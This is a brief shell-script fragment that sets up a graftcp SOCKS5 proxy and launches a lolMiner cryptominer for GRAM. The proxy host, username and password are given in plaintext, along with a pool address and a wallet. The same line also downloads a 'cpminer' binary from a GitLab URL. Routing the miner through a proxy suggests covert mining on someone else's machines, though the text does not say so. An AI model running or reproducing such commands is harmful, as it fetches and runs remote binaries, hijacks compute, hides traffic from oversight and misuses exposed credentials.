...
listen = :2233
loglevel = 1
socks5 = 178.128.121.216:443
socks5_username = adul
socks5_password = adul123
END
...
./graftcp/graftcp ./lol1.83 -a GRAM --pool lolminer.ton.ninja:9999 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --pass x & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
